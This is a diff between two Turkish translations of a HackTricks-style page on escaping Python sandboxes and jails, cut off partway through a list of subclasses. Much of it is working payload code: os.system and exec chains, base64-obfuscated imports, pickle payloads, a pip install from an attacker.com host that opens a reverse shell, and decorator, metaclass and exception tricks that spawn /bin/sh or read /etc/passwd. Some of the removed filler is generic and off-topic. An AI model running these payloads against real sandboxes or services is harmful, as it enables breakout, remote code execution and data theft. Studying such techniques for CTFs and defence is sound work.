@@ -1,32 +1,24 @@
-# Python Kumlama Korumalarını Atlatma
+# Python kum havuzlarını atlatma
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.
+* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) içeren koleksiyonumuzu
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **Hacking hilelerinizi paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+Bu, python kum havuzlarını atlatmak ve keyfi komutları yürütmek için bazı hilelerdir.
 
-En önemli olan zafiyetleri bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.
+## Komut Yürütme Kütüphaneleri
 
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-Bu, python kumlama korumalarını atlatmak ve keyfi komutlar çalıştırmak için bazı hilelerdir.
-
-## Komut Çalıştırma Kütüphaneleri
-
-Bilmeniz gereken ilk şey, zaten içe aktarılmış bir kütüphane ile doğrudan kodu çalıştırıp çalıştıramayacağınızdır veya bu kütüphanelerden herhangi birini içe aktarabileceğinizdir:
+Bilmeniz gereken ilk şey, zaten içe aktarılmış bir kütüphane ile doğrudan kod yürütebilir misiniz veya bu kütüphanelerden herhangi birini içe aktarabilir misiniz:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -59,22 +51,22 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-_**open**_ ve _**read**_ fonksiyonlarının, python sandbox içindeki dosyaları okumak ve sandbox'ı atlamak için **bazı kodları çalıştırmak** için kullanışlı olabileceğini unutmayın.
+Hatırlayın ki _**open**_ ve _**read**_ fonksiyonları, python kum havuzu içindeki dosyaları okumak ve kum havuzunu atlatmak için **bazı kodlar yazmak** için kullanışlı olabilir.
 
 {% hint style="danger" %}
-**Python2 input()** fonksiyonu, program çökmadan önce python kodunu çalıştırmaya izin verir.
+**Python2 input()** fonksiyonu programın çökmeden önce python kodunu çalıştırmasına izin verir.
 {% endhint %}
 
-Python, önce **mevcut dizinden kütüphaneleri yüklemeye çalışır** (aşağıdaki komut, python'ın modülleri nereden yüklediğini yazdıracaktır): `python3 -c 'import sys; print(sys.path)'`
+Python, **kütüphaneleri önceki dizinden yüklemeye çalışır** (aşağıdaki komut, python'ın modülleri nereden yüklediğini yazdıracaktır): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (552).png>)
 
-## Varsayılan kurulu python paketleriyle pickle sandbox'ını atlatma
+## Pickle kum havuzunu varsayılan yüklü python paketleriyle atlatma
 
 ### Varsayılan paketler
 
-Bir **ön kurulu paketlerin listesini** burada bulabilirsiniz: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Bir pickle'dan, python ortamının sistemde yüklü olan **herhangi bir kütüphaneyi içe aktarabileceğinizi** unutmayın.\
+Burada **önceden yüklenmiş** paketlerin bir listesini bulabilirsiniz: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Bir pickle'dan, sistemde yüklü **keyfi kütüphaneleri içe aktarabilirsiniz**.\
 Örneğin, aşağıdaki pickle, yüklendiğinde pip kütüphanesini içe aktaracak:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -88,32 +80,32 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-Daha fazla bilgi için pickle'ın nasıl çalıştığına dair şu linke bakabilirsiniz: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+Daha fazla bilgi için pickle'ın nasıl çalıştığını kontrol edin: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pip paketi
 
-**@isHaacK** tarafından paylaşılan bir hile
+**@isHaacK** tarafından paylaşılan hile
 
-Eğer `pip` veya `pip.main()` erişiminiz varsa, herhangi bir paket kurabilir ve ters kabuk elde etmek için aşağıdaki komutu çağırabilirsiniz:
+Eğer `pip` veya `pip.main()` erişiminiz varsa, keyfi bir paket yükleyebilir ve ters kabuk almak için şunu çağırabilirsiniz:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Ters kabuk oluşturmak için paketi buradan indirebilirsiniz. Lütfen kullanmadan önce **paketin sıkıştırmasını açın, `setup.py` dosyasını değiştirin ve ters kabuk için IP'nizi girin**:
+Pozitif kabuk oluşturmak için paketi buradan indirebilirsiniz. Kullanmadan önce **paketin sıkıştırmasını açmalı, `setup.py` dosyasını değiştirmeli ve ters kabuk için IP'nizi girmelisiniz**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-Bu paket `Reverse` olarak adlandırılıyor. Ancak, ters kabuktan çıktıktan sonra geri kalan kurulumun başarısız olmasını sağlamak için özel olarak oluşturulmuştur, böylece ayrıldığınızda sunucuda **ekstra bir Python paketi kurulu kalmaz**.
+Bu paket `Reverse` olarak adlandırılmıştır. Ancak, ters kabuktan çıktığınızda geri kalan kurulumun başarısız olması için özel olarak hazırlandı, böylece sunucuda ayrıca **herhangi bir ek python paketi bırakmazsınız**.
 {% endhint %}
 
 ## Python kodunu değerlendirme
 
 {% hint style="warning" %}
-Unutmayın, exec çoklu satır dizelerine ve ";" karakterine izin verir, ancak eval etmez (walrus operatörünü kontrol edin)
+exec çoklu satır dizelerine ve ";" karakterine izin verir, ancak eval etmez (walrus operatörünü kontrol edin)
 {% endhint %}
 
-Belirli karakterler yasaklandıysa, kısıtlamayı **geçmek** için **hex/octal/B64** temsillerini kullanabilirsiniz:
+Belirli karakterler yasaklanmışsa, kısıtlamayı **atlatmak** için **hex/octal/B64** temsilini kullanabilirsiniz:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -135,18 +127,6 @@ exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
 ### Python kodunu değerlendirmeye izin veren diğer kütüphaneler
-
-There are several other libraries that allow you to evaluate Python code. These libraries can be used as alternatives to the built-in `eval()` function or to bypass Python sandboxes. Some of these libraries include:
-
-- **`exec()` function**: The `exec()` function can be used to execute Python code dynamically. It takes a string as input and executes it as Python code. However, be cautious when using this function as it can execute arbitrary code and pose security risks.
-
-- **`ast` module**: The `ast` module provides a way to parse Python source code into an abstract syntax tree (AST). This allows you to analyze and manipulate the code before executing it. By using the `ast` module, you can bypass certain restrictions imposed by Python sandboxes.
-
-- **`compile()` function**: The `compile()` function can be used to compile Python source code into bytecode or AST objects. This compiled code can then be executed using the `exec()` function. By using `compile()`, you can bypass certain restrictions imposed by Python sandboxes.
-
-- **Third-party libraries**: There are also third-party libraries available that provide additional functionality for evaluating Python code. Some examples include `execjs`, `pysandbox`, and `RestrictedPython`. These libraries may have their own unique features and capabilities.
-
-It is important to note that using these libraries to evaluate Python code can be risky, as it can potentially lead to code injection vulnerabilities. Therefore, it is crucial to carefully review and validate any input before executing it.
 ```python
 #Pandas
 import pandas as pd
@@ -160,52 +140,7 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
-## Operatörler ve Kısa İpuçları
-
-### Logical Operators (Mantıksal Operatörler)
-
-- `and` operatörü, iki koşulu da sağlaması durumunda `True` döndürür.
-- `or` operatörü, en az bir koşulu sağlaması durumunda `True` döndürür.
-- `not` operatörü, bir koşulu tersine çevirir.
-
-### Comparison Operators (Karşılaştırma Operatörleri)
-
-- `==` operatörü, iki değerin birbirine eşit olup olmadığını kontrol eder.
-- `!=` operatörü, iki değerin birbirine eşit olmadığını kontrol eder.
-- `>` operatörü, bir değerin diğerinden büyük olup olmadığını kontrol eder.
-- `<` operatörü, bir değerin diğerinden küçük olup olmadığını kontrol eder.
-- `>=` operatörü, bir değerin diğerinden büyük veya eşit olup olmadığını kontrol eder.
-- `<=` operatörü, bir değerin diğerinden küçük veya eşit olup olmadığını kontrol eder.
-
-### Short Tricks (Kısa İpuçları)
-
-- `x = x + 1` yerine `x += 1` kullanabilirsiniz.
-- `x = x - 1` yerine `x -= 1` kullanabilirsiniz.
-- `x = x * 2` yerine `x *= 2` kullanabilirsiniz.
-- `x = x / 2` yerine `x /= 2` kullanabilirsiniz.
-- `x = x % 2` yerine `x %= 2` kullanabilirsiniz.
-- `x = x ** 2` yerine `x **= 2` kullanabilirsiniz.
-- `x = x // 2` yerine `x //= 2` kullanabilirsiniz.
-
-### Bitwise Operators (Bit Düzeyinde Operatörler)
-
-- `&` operatörü, iki sayının bit düzeyindeki AND işlemini gerçekleştirir.
-- `|` operatörü, iki sayının bit düzeyindeki OR işlemini gerçekleştirir.
-- `^` operatörü, iki sayının bit düzeyindeki XOR işlemini gerçekleştirir.
-- `~` operatörü, bir sayının bit düzeyindeki tersini alır.
-- `<<` operatörü, bir sayının bit düzeyinde sola kaydırma işlemini gerçekleştirir.
-- `>>` operatörü, bir sayının bit düzeyinde sağa kaydırma işlemini gerçekleştirir.
-
-### Assignment Operators (Atama Operatörleri)
-
-- `=` operatörü, bir değişkene değer atamak için kullanılır.
-- `+=` operatörü, bir değişkene değer eklemek için kullanılır.
-- `-=` operatörü, bir değişkenden değer çıkarmak için kullanılır.
-- `*=` operatörü, bir değişkeni bir değerle çarpmak için kullanılır.
-- `/=` operatörü, bir değişkeni bir değere bölmek için kullanılır.
-- `%=`, bir değişkenin modunu almak için kullanılır.
-- `**=`, bir değişkeni bir değere üs almak için kullanılır.
-- `//=`, bir değişkeni bir değere bölerken tam sayı bölme işlemi yapmak için kullanılır.
+## Operatörler ve kısa hileler
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -214,9 +149,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Kodlamalar aracılığıyla (UTF-7) korumaları atlatma
+## Kod korumalarını aşma (UTF-7)
 
-[**Bu yazıda**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UTF-7 kullanılarak, görünürde bir kum havuzu içinde keyfi Python kodu yüklenip yürütülüyor.
+[**Bu yazıda**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7, açık bir kum havuzu içinde keyfi Python kodunu yüklemek ve yürütmek için kullanılmıştır:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -227,13 +162,13 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-Ayrıca, diğer kodlamaları kullanarak, örneğin `raw_unicode_escape` ve `unicode_escape`, bunu atlayabilirsiniz.
+Ayrıca, diğer kodlamaları kullanarak da bunu atlayabilirsiniz, örn. `raw_unicode_escape` ve `unicode_escape`.
 
-## Çağrı yapmadan Python çalıştırma
+## Çağrı yapmadan Python yürütme
 
-Eğer **çağrı yapmanıza izin vermeyen** bir Python hapishanesindeyseniz, yine de **keyfi fonksiyonları, kodu** ve **komutları** çalıştırmanın bazı yolları vardır.
+Eğer **çağrı yapmanıza izin vermeyen** bir python hapishanesindeyseniz, yine de **keyfi fonksiyonlar, kod** ve **komutlar** yürütmek için bazı yollar vardır.
 
-### [Dekoratörler](https://docs.python.org/3/glossary.html#term-decorator) ile RCE
+### [Dekoratörler](https://docs.python.org/3/glossary.html#term-decorator) ile Uzaktan Kod Yürütme (RCE)
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 @exec
@@ -255,13 +190,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### Nesne oluşturma ve aşırı yükleme ile RCE
+### RCE nesneler oluşturma ve aşırı yükleme
 
-Bir sınıfı **tanımlayabilir** ve o sınıfın bir nesnesini **oluşturabilirseniz**, doğrudan çağırmadan **tetiklenebilen** farklı yöntemleri **yazabilir/üzerine yazabilirsiniz**.
+Eğer bir **sınıf bildirebilir** ve o sınıfın bir **nesnesini oluşturabilirseniz**, **farklı yöntemleri yazabilir/yeniden yazabilirsiniz** ve bunlar **doğrudan çağrılmadan tetiklenebilir**.
 
 #### Özel sınıflarla RCE
 
-Bazı **sınıf yöntemlerini** (_mevcut sınıf yöntemlerini üzerine yazarak veya yeni bir sınıf oluşturarak_) doğrudan çağırmadan **tetiklendiğinde** keyfi kodları **çalıştırmak için** değiştirebilirsiniz.
+Bazı **sınıf yöntemlerini** değiştirebilirsiniz (_mevcut sınıf yöntemlerini üzerine yazarak veya yeni bir sınıf oluşturarak_), böylece bunlar **doğrudan çağrılmadan tetiklendiğinde** **keyfi kodları yürütebilirsiniz**.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -311,9 +246,9 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### [Metasınıflar](https://docs.python.org/3/reference/datamodel.html#metaclasses) kullanarak nesneler oluşturma
+#### [Metaclass](https://docs.python.org/3/reference/datamodel.html#metaclasses) kullanarak nesneler oluşturma
 
-Metasınıfların bize izin verdiği temel şey, hedef sınıfı bir metasınıf olarak kullanarak doğrudan yapıcıyı çağırmadan bir sınıf örneği oluşturmaktır.
+Metaclass'ların bize izin verdiği temel şey, hedef sınıfın metaclass olarak kullanılarak yeni bir sınıf oluşturarak, **kurucuyu doğrudan çağırmadan bir sınıf örneği oluşturmaktır**.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -328,9 +263,9 @@ Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-#### İstisnalarla nesne oluşturma
+#### İstisnalarla nesneler oluşturma
 
-Bir **istisna tetiklendiğinde**, **Exception**'ın bir nesnesi **doğrudan yapıcıyı çağırmadan oluşturulur** ([**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez) tarafından bir hile):
+Bir **istisna tetiklendiğinde**, **Exception**'dan bir nesne **oluşturulur** ve doğrudan yapıcıyı çağırmak zorunda kalmazsınız ([**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)’den bir hile):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -351,61 +286,6 @@ k + 'import os; os.system("sh")' #RCE abusing __add__
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
 ### Daha Fazla Uzaktan Kod Çalıştırma (RCE)
-
-Bu bölümde, Python kum havuzlarını atlamak için kullanılabilecek daha fazla teknik hakkında bilgi bulacaksınız.
-
-#### 1. `os.system()` Kullanma
-
-`os.system()` fonksiyonu, bir komutu çalıştırmak için kullanılır. Bu fonksiyon, Python kum havuzlarını atlamak için etkili bir yöntem olabilir. Aşağıdaki örnek, `os.system()` kullanarak bir komutun nasıl çalıştırılabileceğini göstermektedir:
-
-```python
-import os
-
-command = "ls -la"
-os.system(command)
-```
-
-Bu örnekte, `os.system()` fonksiyonu, `ls -la` komutunu çalıştırır ve sonucunu ekrana yazdırır.
-
-#### 2. `subprocess.Popen()` Kullanma
-
-`subprocess.Popen()` fonksiyonu, bir komutu çalıştırmak için kullanılır ve `os.system()` fonksiyonuna benzer şekilde Python kum havuzlarını atlamak için kullanılabilir. Aşağıdaki örnek, `subprocess.Popen()` kullanarak bir komutun nasıl çalıştırılabileceğini göstermektedir:
-
-```python
-import subprocess
-
-command = "ls -la"
-subprocess.Popen(command, shell=True)
-```
-
-Bu örnekte, `subprocess.Popen()` fonksiyonu, `ls -la` komutunu çalıştırır ve sonucunu ekrana yazdırır.
-
-#### 3. `eval()` Kullanma
-
-`eval()` fonksiyonu, bir Python ifadesini değerlendirmek için kullanılır. Bu fonksiyon, Python kum havuzlarını atlamak için kullanılabilecek bir diğer yöntemdir. Aşağıdaki örnek, `eval()` kullanarak bir Python ifadesinin nasıl değerlendirilebileceğini göstermektedir:
-
-```python
-expression = "__import__('os').system('ls -la')"
-eval(expression)
-```
-
-Bu örnekte, `eval()` fonksiyonu, `__import__('os').system('ls -la')` ifadesini değerlendirir ve sonucunu ekrana yazdırır.
-
-#### 4. `exec()` Kullanma
-
-`exec()` fonksiyonu, bir Python kodunu çalıştırmak için kullanılır. Bu fonksiyon, Python kum havuzlarını atlamak için kullanılabilecek bir diğer yöntemdir. Aşağıdaki örnek, `exec()` kullanarak bir Python kodunun nasıl çalıştırılabileceğini göstermektedir:
-
-```python
-code = """
-import os
-os.system('ls -la')
-"""
-exec(code)
-```
-
-Bu örnekte, `exec()` fonksiyonu, `import os\nos.system('ls -la')` kodunu çalıştırır ve sonucunu ekrana yazdırır.
-
-Bu teknikler, Python kum havuzlarını atlamak için kullanılabilecek bazı temel yöntemleri göstermektedir. Ancak, her durumda etkili olmayabilirler ve dikkatli bir şekilde kullanılmalıdırlar. Ayrıca, güvenlik açıklarına neden olabilecek potansiyel riskleri de göz önünde bulundurmalısınız.
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
@@ -427,26 +307,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### builtins yardımıyla dosya okuma & lisans
-
-Bu yöntem, Python kum havuzlarını atlamak için kullanılabilir. Kum havuzları, Python kodunun güvenli bir şekilde çalışmasını sağlamak için kullanılan güvenlik önlemleridir. Bu yöntem, `builtins` modülündeki `help` ve `license` fonksiyonlarını kullanarak dosya okumayı sağlar.
-
-```python
-import builtins
-
-def read_file(file_path):
-    with builtins.open(file_path, 'r') as file:
-        content = file.read()
-    return content
-
-file_path = '/path/to/file.txt'
-file_content = read_file(file_path)
-print(file_content)
-```
-
-Bu kod, `builtins` modülündeki `open` fonksiyonunu kullanarak belirtilen dosyayı okur. Dosya içeriği, `read` fonksiyonuyla okunur ve `content` değişkenine atanır. Son olarak, `file_content` değişkeni ekrana yazdırılır.
-
-Bu yöntem, Python kum havuzlarını atlamak için etkili bir yol sağlar. Ancak, bu tür bir kullanım, güvenlik açıklarına neden olabilir ve yasalara aykırı olabilir. Bu nedenle, bu yöntemi yalnızca yasal ve etik sınırlar içinde kullanmalısınız.
+### builtins yardımıyla dosya okuma ve lisans
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -455,30 +316,22 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+## Dahili Fonksiyonlar
 
-En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.
+* [**Python2'nin dahili fonksiyonları**](https://docs.python.org/2/library/functions.html)
+* [**Python3'ün dahili fonksiyonları**](https://docs.python.org/3/library/functions.html)
 
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-## Yerleşik Fonksiyonlar
-
-* [**Python2'nin yerleşik fonksiyonları**](https://docs.python.org/2/library/functions.html)
-* [**Python3'ün yerleşik fonksiyonları**](https://docs.python.org/3/library/functions.html)
-
-Eğer **`__builtins__`** nesnesine erişebiliyorsanız, kütüphaneleri içe aktarabilirsiniz (dikkat edin, burada ayrıca son bölümde gösterilen diğer dize gösterimini de kullanabilirsiniz):
+Eğer **`__builtins__`** nesnesine erişebilirseniz kütüphaneleri içe aktarabilirsiniz (unutmayın ki burada ayrıca son bölümde gösterilen diğer string temsillerini de kullanabilirsiniz):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### __builtins__ Yoksa
+### Dahili Fonksiyonlar
 
-`__builtins__` olmadığında, hiçbir şeyi içe aktaramaz, hatta dosya okuyup yazamazsınız çünkü **tüm global fonksiyonlar** (`open`, `import`, `print` gibi) **yüklü değildir**.\
-Ancak, **varsayılan olarak python birçok modülü belleğe yükler**. Bu modüller zararsız gibi görünebilir, ancak bazıları içlerinde erişilebilen **tehlikeli** işlevleri de içe aktarır ve hatta **keyfi kod yürütme** elde etmek için kullanılabilir.
+`__builtins__`'e sahip olmadığınızda, **hiçbir şeyi içe aktaramayacak** ve hatta dosya okuyup yazamayacaksınız çünkü **tüm global fonksiyonlar** (örneğin `open`, `import`, `print`...) **yüklenmemiştir**.\
+Ancak, **varsayılan olarak python birçok modülü belleğe yükler**. Bu modüller zararsız görünebilir, ancak bazıları içlerinde **tehlikeli** işlevsellikler de **içe aktarabilir** ve hatta **keyfi kod yürütme** elde etmek için erişilebilir olabilir.
 
-Aşağıdaki örneklerde, bu "**zararsız**" modüllerin içinde yüklenen **tehlikeli** **işlevlere** erişmek için nasıl **kötüye kullanabileceğinizi** gözlemleyebilirsiniz.
+Aşağıdaki örneklerde, bu "**zararsız**" modüllerin **içinde yüklü** olan **tehlikeli işlevselliklere** **erişmek** için nasıl **kötüye kullanılabileceğini** görebilirsiniz.
 
 **Python2**
 ```python
@@ -502,16 +355,6 @@ import __builtin__
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
-
-Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.
-
-However, Python3 also has a feature called "sandboxing" that is designed to restrict the execution of potentially malicious code. Sandboxing is commonly used in cloud/SaaS platforms to provide a secure environment for running untrusted code.
-
-In this section, we will explore various techniques to bypass Python3 sandboxes and execute arbitrary code. These techniques can be useful for penetration testers and security researchers to identify vulnerabilities in sandboxed environments.
-
-Please note that bypassing Python3 sandboxes is a sensitive topic and should only be done with proper authorization and for legitimate purposes. Unauthorized access or misuse of these techniques can lead to legal consequences.
-
-Let's dive into the world of Python3 sandbox bypass techniques and learn how to effectively bypass these security measures.
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -530,7 +373,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Aşağıda, builtins'i bulabileceğiniz onlarca/yüzlerce yer bulmak için daha büyük bir fonksiyon**](./#recursive-search-of-builtins-globals) bulunmaktadır.
+[**Aşağıda daha büyük bir fonksiyon**](./#recursive-search-of-builtins-globals) bulunmaktadır ve bu fonksiyon sayesinde **builtins**'i bulabileceğiniz onlarca/**yüzlerce yer** bulunmaktadır.
 
 #### Python2 ve Python3
 ```python
@@ -539,49 +382,6 @@ __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ 
 __builtins__["__import__"]('os').system('ls')
 ```
 ### Dahili yükler
-
-Bu bölümde, Python sandıklarını atlamak için kullanılabilecek bazı dahili yükler bulunmaktadır. Bu yükler, Python'un dahili işlevlerini kullanarak sandık mekanizmalarını etkisiz hale getirmeyi amaçlamaktadır.
-
-#### `__import__`
-
-Bu yöntem, `__import__` işlevini kullanarak sandık mekanizmalarını atlamayı hedefler. `__import__` işlevi, Python'da modüllerin dinamik olarak yüklenmesini sağlar. Bu nedenle, sandık mekanizmaları genellikle bu işlevi engellemeye çalışır. Ancak, bazı durumlarda `__import__` işlevi hala kullanılabilir.
-
-```python
-__import__('os').system('command')
-```
-
-Bu örnekte, `os` modülü `__import__` işlevi kullanılarak yüklenir ve ardından `system` işlevi kullanılarak bir komut çalıştırılır.
-
-#### `eval`
-
-`eval` işlevi, bir dizeyi Python koduna dönüştürerek çalıştırır. Bu, sandık mekanizmalarını atlamak için kullanılabilecek bir başka yöntemdir.
-
-```python
-eval("__import__('os').system('command')")
-```
-
-Bu örnekte, `__import__` işlevi `eval` işlevi kullanılarak çalıştırılır ve ardından `system` işlevi kullanılarak bir komut çalıştırılır.
-
-#### `exec`
-
-`exec` işlevi, bir dizeyi Python kodu olarak çalıştırır. Bu, sandık mekanizmalarını atlamak için kullanılabilecek bir başka yöntemdir.
-
-```python
-exec("__import__('os').system('command')")
-```
-
-Bu örnekte, `__import__` işlevi `exec` işlevi kullanılarak çalıştırılır ve ardından `system` işlevi kullanılarak bir komut çalıştırılır.
-
-#### `compile`
-
-`compile` işlevi, bir dizeyi Python koduna derler. Bu, sandık mekanizmalarını atlamak için kullanılabilecek bir başka yöntemdir.
-
-```python
-code = compile("__import__('os').system('command')", "<string>", "exec")
-exec(code)
-```
-
-Bu örnekte, `__import__` işlevi `compile` işlevi kullanılarak derlenir ve ardından `exec` işlevi kullanılarak bir komut çalıştırılır.
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -589,7 +389,7 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## Global ve yerel değişkenler
+## Globals ve locals
 
 **`globals`** ve **`locals`** kontrol etmek, erişebileceğiniz şeyleri bilmek için iyi bir yoldur.
 ```python
@@ -615,15 +415,15 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 